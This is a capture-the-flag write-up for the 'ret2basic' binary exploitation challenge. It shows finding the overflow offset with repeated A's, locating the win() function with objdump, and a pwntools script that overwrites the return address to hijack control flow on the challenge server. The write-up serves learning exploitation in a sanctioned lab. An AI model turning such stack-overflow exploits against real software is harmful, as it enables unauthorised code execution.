# ret2basic

ret2basic is a binary exploitation challenge worth 200 points

> Can you ret2win? 

## Challenge Goal

We need to cause a buffer overflow and change the instruction pointer to point
to the address of the win() function.

## Analyzing the program

Start by examing the binary:
```
$ file ./ret2basic             
./ret2basic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=3ca85eae693fed659275c0eed9c313e7f0083b85, for GNU/Linux 4.4.0, not
stripped
```

We see that the binary is 64-bit and the debugging information and symbols are
not stripped. This is all good info to know.

Now run it:

```
$ ./ret2basic 
Can you overflow this?: yes
Nope :(
```

## Causing a Segfault
I stuffed the input with a string of A's until I caused a segfault.

```
$ python -c "print 'A' * 200" | ./ret2basic
Can you overflow this?:
zsh: segmentation fault  ./ret2basi
```

I played around with the number of A's to generate, and found the sweet spot to
be 120. This fills the buffer and the base pointer, but does not overflow the
instruction pointer (RIP). Meaning, whatever we push onto the stack next will be
executed.

We need to push the address of the win function in order to get the flag. This
can be found with ```objdump```:

```
$ objdump -D ret2basic| grep "<win>"
0000000000401215 <win>:
```

Time to put it all together and create an exploit!

## Crafting an exploit payload

```
from pwn import *

local = False

if local:
        p = process('./ret2basic')
        p.recvuntil('Can you overflow this?:')
else:
        p = remote('challenge.nahamcon.com', 30413)

# Craft the payload
payload  = b'A' * 120                   # Fill buffer up to RIP
payload += p64(0x0000000000401215)      # Overwrite RIP with addr of win()

p.sendline(payload)

# Print the flag
print(p.recvline())
p.interactive()
```

Tada!
